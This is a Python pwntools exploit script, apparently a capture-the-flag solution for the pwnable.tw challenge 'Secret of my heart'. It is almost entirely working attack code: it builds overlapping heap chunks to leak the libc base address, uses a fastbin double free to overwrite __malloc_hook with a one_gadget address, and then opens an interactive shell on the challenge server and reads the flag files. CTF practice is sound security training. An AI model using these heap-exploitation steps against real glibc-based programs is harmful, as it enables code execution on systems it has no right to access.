#Exploit for pwnable.tw/Secret of my heart
from pwn import *

libc = ELF('./Heart/libc_64.so.6')
target = process(['./secret_of_my_heart', './ld-2.23.so'], env={"LD_PRELOAD":"./Heart/libc_64.so.6"})
target = remote('chall.pwnable.tw', 10302)
gadgets = [0x45216, 0x4526a, 0xef6c4, 0xf0567]

def sa(s, d):
	(target.sendafter(s, d))

def add(size, secret):
	sa(":", "1")
	sa(":", str(size))
	sa(":", "whoamiT")
	sa(":", secret)

def show(idx):
	sa(":", "2")
	sa(":", str(idx))

def delete(idx):
	sa(":", "3")
	sa(":", str(idx))

add(0xf8, "0")
add(0x68, "1")
add(0xf8, "2")
add(0xf8, "3")

delete(0)
delete(1)
add(0x68, "0"*0x60 + p64(0x170))
delete(2)

add(0xf8, "1")
show(0)
target.recvuntil("Secret : ")
libc_base = u64(target.recvline().strip().ljust(8, '\x00')) - (0x00007f1cf2f5eb78 - 0x00007f1cf2b9b000)
log.info("LIBC Base: " + hex(libc_base))

add(0x68, "2")		#overlaps with chunk 0
add(0x68, "4")

delete(0)
delete(4)
delete(2)

add(0x68, p64(libc_base + libc.sym['__malloc_hook'] - 0x23))
add(0x68, "HACKING")
add(0x68, "HACKING AGAIN")
add(0x68, "A"*0x13 + p64(libc_base + gadgets[2]))

#Invoke fastbin double free error(that invokes malloc internally)
delete(0)
delete(5)		#overlaps with chunk 0

target.sendline("cat /home/*/fl*")

target.interactive()
